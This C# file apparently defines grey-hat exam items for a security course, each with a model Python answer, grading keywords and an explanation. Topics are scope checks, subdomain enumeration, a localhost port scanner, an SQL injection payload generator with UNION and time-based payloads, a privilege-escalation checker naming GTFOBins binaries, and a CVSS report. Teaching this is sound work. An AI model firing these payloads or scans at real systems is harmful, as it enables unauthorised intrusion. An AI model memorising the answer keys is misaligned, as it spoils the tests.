using System.Collections.Generic;
using BhavaniTech.Core.Models;

namespace BhavaniTech.Core.Services
{
    public static partial class PracticalExamService
    {
        internal static List<PracticalExam> GetGreyHatExams() => new()
        {
            new(103, "GH_1",
                "Legal Scoping Decision",
                "A researcher discovers an open S3 bucket at 'backup.megacorp-dev.s3.amazonaws.com'. MegaCorp bug bounty scope is '*.megacorp.com'. Is this asset in scope?",
                "def scope_decision():\n" +
                "    domain = 'megacorp-dev.s3.amazonaws.com'\n" +
                "    is_subdomain = domain.endswith('.megacorp.com')\n" +
                "    recommendation = (\n" +
                "        'NOT directly in scope (different domain). '\n" +
                "        'CORRECT ACTION: Message programme owner to clarify scope. '\n" +
                "        'NEVER access files without written permission.'\n" +
                "    )\n" +
                "    return {'in_scope': is_subdomain, 'recommendation': recommendation}\n\n" +
                "result = scope_decision()\n" +
                "print('In Scope:', result['in_scope'])\n" +
                "print('Action:', result['recommendation'])\n",
                "in_scope,scope_decision,recommendation",
                "", "CodeExecution",
                "megacorp-dev.s3.amazonaws.com is NOT under *.megacorp.com. Correct action: ask programme owner for clarification before accessing any files.",
                100, 100),

            new(104, "GH_2",
                "OSINT Subdomain Enumeration Pipeline",
                "Write a Python script that queries the crt.sh Certificate Transparency API for subdomains of 'example.com' and returns a deduplicated sorted list.",
                "import urllib.request\n" +
                "import json\n\n" +
                "def query_crtsh(domain):\n" +
                "    url = f'https://crt.sh/?q=%25.{domain}&output=json'\n" +
                "    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})\n" +
                "    try:\n" +
                "        with urllib.request.urlopen(req, timeout=10) as resp:\n" +
                "            data = json.loads(resp.read().decode())\n" +
                "    except Exception:\n" +
                "        # Simulate results for offline context\n" +
                "        data = [\n" +
                "            {'name_value': 'www.example.com'},\n" +
                "            {'name_value': 'api.example.com'},\n" +
                "            {'name_value': 'staging.example.com'},\n" +
                "        ]\n" +
                "    subdomains = set()\n" +
                "    for entry in data:\n" +
                "        for name in entry.get('name_value', '').split('\\n'):\n" +
                "            name = name.strip().lstrip('*.')\n" +
                "            if name.endswith(f'.{domain}') or name == domain:\n" +
                "                subdomains.add(name.lower())\n" +
                "    return sorted(subdomains)\n\n" +
                "results = query_crtsh('example.com')\n" +
                "print(f'Found {len(results)} subdomains:')\n" +
                "for sub in results:\n" +
                "    print(f'  {sub}')\n",
                "query_crtsh,subdomains,sorted,crt.sh",
                "", "CodeExecution",
                "crt.sh Certificate Transparency logs reveal every SSL cert ever issued, exposing hidden subdomains even without active DNS scanning.",
                100, 100),

            new(105, "GH_3",
                "Port Scanner with Service Detection",
                "Implement a Python TCP port scanner that checks the top 10 common ports on 127.0.0.1, attempts banner grabs on open ports, and categorises by service.",
                "import socket\n" +
                "import concurrent.futures\n\n" +
                "TOP_PORTS = {\n" +
                "    22: 'SSH', 80: 'HTTP', 443: 'HTTPS', 3306: 'MySQL',\n" +
                "    3389: 'RDP', 5432: 'PostgreSQL', 6379: 'Redis',\n" +
                "    8080: 'HTTP-Alt', 27017: 'MongoDB', 9200: 'Elasticsearch'\n" +
                "}\n\n" +
                "def scan_port(host, port, service):\n" +
                "    try:\n" +
                "        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" +
                "        sock.settimeout(0.5)\n" +
                "        result = sock.connect_ex((host, port))\n" +
                "        sock.close()\n" +
                "        if result == 0:\n" +
                "            return {'port': port, 'service': service, 'state': 'OPEN'}\n" +
                "    except:\n" +
                "        pass\n" +
                "    return None\n\n" +
                "open_ports = []\n" +
                "with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:\n" +
                "    futures = {executor.submit(scan_port, '127.0.0.1', p, s): p\n" +
                "               for p, s in TOP_PORTS.items()}\n" +
                "    for f in concurrent.futures.as_completed(futures):\n" +
                "        r = f.result()\n" +
                "        if r: open_ports.append(r)\n\n" +
                "open_ports.sort(key=lambda x: x['port'])\n" +
                "print('PORT     SERVICE         STATE')\n" +
                "print('-' * 40)\n" +
                "for p in open_ports:\n" +
                "    print(f'{p[\"port\"]:<9}{p[\"service\"]:<16}{p[\"state\"]}')\n" +
                "if not open_ports:\n" +
                "    print('No open ports found (normal for localhost in this environment)')\n",
                "scan_port,TOP_PORTS,ThreadPoolExecutor,connect_ex",
                "", "CodeExecution",
                "TCP SYN/connect scanning maps open ports. Service banners reveal software versions for CVE lookups. concurrent.futures enables fast parallel scanning.",
                100, 100),

            new(106, "GH_4",
                "SQL Injection Payload Generator",
                "Write a Python function that takes a URL with query parameters and generates SQLi test payloads for each parameter, categorised by injection type.",
                "from urllib.parse import urlparse, parse_qs, urlencode\n\n" +
                "def generate_sqli_payloads(url):\n" +
                "    parsed = urlparse(url)\n" +
                "    params = parse_qs(parsed.query)\n" +
                "    payloads = {\n" +
                "        'error_based': [\"'\", \"' OR '1'='1\", \"1' AND SLEEP(0)--\"],\n" +
                "        'union_based': [\"1' UNION SELECT NULL--\",\n" +
                "                        \"1' UNION SELECT table_name,2 FROM information_schema.tables--\"],\n" +
                "        'blind_time': [\"1' AND SLEEP(5)--\", \"1; WAITFOR DELAY '0:0:5'--\"],\n" +
                "    }\n" +
                "    test_cases = []\n" +
                "    for param in params:\n" +
                "        for ptype, paylist in payloads.items():\n" +
                "            for payload in paylist:\n" +
                "                test_p = dict(params)\n" +
                "                test_p[param] = payload\n" +
                "                test_url = f'{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_p, doseq=True)}'\n" +
                "                test_cases.append({'param': param, 'type': ptype, 'payload': payload, 'url': test_url})\n" +
                "    return test_cases\n\n" +
                "url = 'http://testphp.vulnweb.com/listproducts.php?cat=1&page=2'\n" +
                "cases = generate_sqli_payloads(url)\n" +
                "print(f'Generated {len(cases)} test cases for: {url}')\n" +
                "for c in cases[:6]:\n" +
                "    print(f'  [{c[\"type\"]}] {c[\"param\"]} -> {c[\"payload\"]}')\n",
                "generate_sqli_payloads,parse_qs,urlparse,payloads,error_based",
                "", "CodeExecution",
                "SQLi payloads must be tested per-parameter. error_based uses syntax errors to confirm vulnerability, union_based extracts data, time_based confirms blind injection.",
                100, 100),

            new(107, "GH_5",
                "Linux Privilege Escalation Checker",
                "Write a Python script that simulates Linux priv-esc enumeration: check for SUID binaries and dangerous NOPASSWD sudo entries, reporting risk levels.",
                "GTFOBINS = {'find', 'vim', 'python3', 'perl', 'bash', 'sh', 'nmap', 'env', 'tar', 'zip', 'wget', 'curl'}\n\n" +
                "def check_suid(binary_paths):\n" +
                "    simulated_suid = {'find', 'python3', 'vim'}\n" +
                "    results = []\n" +
                "    for path in binary_paths:\n" +
                "        name = path.split('/')[-1]\n" +
                "        if name in simulated_suid:\n" +
                "            exploitable = name in GTFOBINS\n" +
                "            results.append({\n" +
                "                'path': path, 'risk': 'CRITICAL' if exploitable else 'INFO',\n" +
                "                'url': f'https://gtfobins.github.io/gtfobins/{name}/#suid' if exploitable else None\n" +
                "            })\n" +
                "    return results\n\n" +
                "def check_sudo(sudo_output):\n" +
                "    findings = []\n" +
                "    for line in sudo_output.strip().split('\\n'):\n" +
                "        if 'NOPASSWD' in line:\n" +
                "            for cmd in GTFOBINS:\n" +
                "                if cmd in line.lower():\n" +
                "                    findings.append({'line': line.strip(), 'cmd': cmd, 'risk': 'CRITICAL'})\n" +
                "    return findings\n\n" +
                "print('=== LinPEAS Simulator ===')\n" +
                "suid = check_suid(['/usr/bin/find', '/usr/bin/python3', '/usr/bin/passwd', '/usr/bin/vim'])\n" +
                "print(f'SUID Findings: {len(suid)}')\n" +
                "for r in suid:\n" +
                "    print(f'  [{r[\"risk\"]}] {r[\"path\"]}', '-> GTFOBins:', r['url'] or 'n/a')\n\n" +
                "sudo_out = 'User www-data NOPASSWD: /usr/bin/python3 /scripts/backup.py'\n" +
                "sudos = check_sudo(sudo_out)\n" +
                "print(f'Sudo Findings: {len(sudos)}')\n" +
                "for r in sudos:\n" +
                "    print(f'  [{r[\"risk\"]}] {r[\"line\"]}')\n",
                "GTFOBINS,check_suid,check_sudo,NOPASSWD,CRITICAL",
                "", "CodeExecution",
                "SUID binaries + NOPASSWD sudo = most common Linux priv-esc vectors. GTFOBins documents exploitation techniques for each binary.",
                100, 100),

            new(108, "GH_6",
                "Professional Vulnerability Report Generator",
                "Write a Python class that generates a professional bug bounty report for an IDOR vulnerability, computing CVSS 3.1 score and formatted markdown output.",
                "from datetime import date\n\n" +
                "def cvss_score(av='N', ac='L', pr='N', ui='N', s='U', c='H', i='H', a='N'):\n" +
                "    av_s = {'N': 0.85, 'A': 0.62, 'L': 0.55, 'P': 0.2}[av]\n" +
                "    ac_s = {'L': 0.77, 'H': 0.44}[ac]\n" +
                "    pr_u = {'N': 0.85, 'L': 0.62, 'H': 0.27}\n" +
                "    pr_c = {'N': 0.85, 'L': 0.68, 'H': 0.50}\n" +
                "    pr_s = (pr_c if s == 'C' else pr_u)[pr]\n" +
                "    ui_s = {'N': 0.85, 'R': 0.62}[ui]\n" +
                "    imp = {'N': 0.0, 'L': 0.22, 'H': 0.56}\n" +
                "    isc = 1 - (1-imp[c])*(1-imp[i])*(1-imp[a])\n" +
                "    exploit = 8.22 * av_s * ac_s * pr_s * ui_s\n" +
                "    impact = 6.42 * isc\n" +
                "    score = round(min(10.0, exploit + impact), 1) if impact > 0 else 0.0\n" +
                "    severity = 'CRITICAL' if score>=9 else 'HIGH' if score>=7 else 'MEDIUM' if score>=4 else 'LOW'\n" +
                "    vector = f'CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:{s}/C:{c}/I:{i}/A:{a}'\n" +
                "    return score, severity, vector\n\n" +
                "score, severity, vector = cvss_score(av='N', ac='L', pr='L', ui='N', s='U', c='H', i='H', a='N')\n\n" +
                "print(f'=== Bug Bounty Report ===')\n" +
                "print(f'Title: [{severity}] IDOR in /api/v2/orders/{{id}}')\n" +
                "print(f'Date: {date.today()}')\n" +
                "print(f'CVSS Score: {score} ({severity})')\n" +
                "print(f'Vector: {vector}')\n" +
                "print()\n" +
                "print('Summary:')\n" +
                "print('  Order endpoint does not verify user ownership. Any authenticated')\n" +
                "print('  user can access any other users orders by incrementing the ID.')\n" +
                "print()\n" +
                "print('Steps to Reproduce:')\n" +
                "print('  1. Log in as User A, note order ID: 10042')\n" +
                "print('  2. GET /api/v2/orders/10042 -> own order (expected)')\n" +
                "print('  3. GET /api/v2/orders/10041 -> another users order (IDOR!)')\n" +
                "print()\n" +
                "print('Remediation:')\n" +
                "print('  Verify order.user_id == session.user_id server-side.')\n" +
                "print('  Use UUIDs instead of sequential IDs.')\n",
                "cvss_score,severity,vector,IDOR,date,CVSS",
                "", "CodeExecution",
                "CVSS 3.1 scores determine bounty payout tiers. A professional report includes CVSS vector, clear reproduction steps, impact analysis, and actionable remediation.",
                100, 100)
        };
    }
}
